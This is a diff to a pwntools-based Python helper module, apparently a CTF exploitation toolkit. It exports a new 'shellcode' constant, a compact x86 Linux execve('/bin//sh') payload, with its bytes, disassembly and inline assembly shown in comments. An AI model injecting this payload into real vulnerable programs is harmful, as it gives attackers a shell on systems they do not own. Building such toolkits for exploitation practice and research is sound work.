@@ -13,6 +13,7 @@ __all__ = [
     'factor', 'gcd', 'ext_euclid', 'rsa_decrypt',
     'unhex', 'ljust', 'rjust', 'gzipc', 'gzipd',
     'debug',
+    'shellcode',
 ]
 
 # export all imported from pwn
@@ -321,3 +322,41 @@ pwnlib.tubes.tube.tube._recvregex = pwnlib.tubes.tube.tube.recvregex
 pwnlib.tubes.tube.tube.recvregex = _recvregex
 pwnlib.tubes.tube.tube._recvline_regex = pwnlib.tubes.tube.tube.recvline_regex
 pwnlib.tubes.tube.tube.recvline_regex = _recvline_regex
+
+
+#################################
+### a short shellcode for x86 ###
+#################################
+
+# // al -> sys_execve
+# // bx -> filename
+# // cx -> args
+# // dx -> env
+# // "\xb0\x0b"                  // mov    $0xb,%al
+# "\x6a\x0b"                  // push   $0xb
+# "\x58"                      // pop    %eax
+# "\x99"                      // cltd
+# "\x31\xc9"                  // xor    %ecx,%ecx
+# "\x52"                      // push   %edx
+# "\x68\x2f\x2f\x73\x68"      // push   $0x68732f2f
+# "\x68\x2f\x62\x69\x6e"      // push   $0x6e69622f
+# "\x89\xe3"                  // mov    %esp,%ebx
+# "\xcd\x80"                  // int    $0x80
+#
+# "\x6a\x0b\x58\x99\x31\xc9\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
+# "j\x0bX\x991\xc9Rh//shh/bin\x89\xe3\xcd\x80"
+# "j\x0b""X\x99""1\xc9""Rh//shh/bin\x89\xe3\xcd\x80"
+#
+# __asm__(
+#     "push   $0xb        \n\t"
+#     "pop    %eax        \n\t"
+#     "cltd               \n\t"
+#     "xor    %ecx,%ecx   \n\t"
+#     "push   %edx        \n\t"
+#     "push   $0x68732f2f \n\t"
+#     "push   $0x6e69622f \n\t"
+#     "mov    %esp,%ebx   \n\t"
+#     "int    $0x80       \n\t"
+# );
+
+shellcode = 'j\x0bX\x991\xc9Rh//shh/bin\x89\xe3\xcd\x80'
